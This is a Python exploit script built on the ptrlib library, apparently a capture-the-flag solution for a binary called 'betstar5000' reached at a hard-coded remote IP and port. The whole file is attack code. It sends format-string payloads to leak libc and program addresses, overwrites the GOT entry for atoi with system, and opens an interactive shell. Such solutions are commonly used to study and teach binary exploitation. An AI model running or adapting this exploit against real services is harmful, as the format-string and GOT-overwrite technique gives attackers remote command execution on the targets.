from ptrlib import *

elf = ELF("./betstar5000")
libc = ELF("./libc-2.27.so")
#sock = Process("./betstar5000")
sock = Socket("13.53.69.114", 50000)

# set players
sock.sendline("1")
sock.sendline("%p.%p.%p")

# leak addr
sock.sendlineafter("game\n", "1")
sock.sendline("1")
sock.sendline("0")
sock.recvuntil("*: ")
r = sock.recvline().split(b'.')
libc_base = int(r[1], 16) - libc.symbol('_IO_2_1_stdin_')
proc_base = int(r[2], 16) - 0x8d5
logger.info("libc = " + hex(libc_base))
logger.info("proc = " + hex(proc_base))

# change name
sock.sendlineafter("game\n", "4")
sock.sendline("0")
sock.sendline("%{}c%7$hhn".format(0x88))

# overwrite name[0] to &name[1]
sock.sendlineafter("game\n", "1")
sock.sendline("1")
sock.sendline("0")

# add player
sock.sendlineafter("game\n", "3")
sock.sendline("taro")

# overwrite atoi to system
sock.sendlineafter("game\n", "4")
sock.sendline("0")
sock.sendline(p32(proc_base + elf.got("atoi")))
sock.sendlineafter("game\n", "4")
sock.sendline("1")
sock.sendline(p32(libc_base + libc.symbol("system")))

# get the shell!
sock.sendlineafter("game\n", "sh\x00")

sock.interactive()
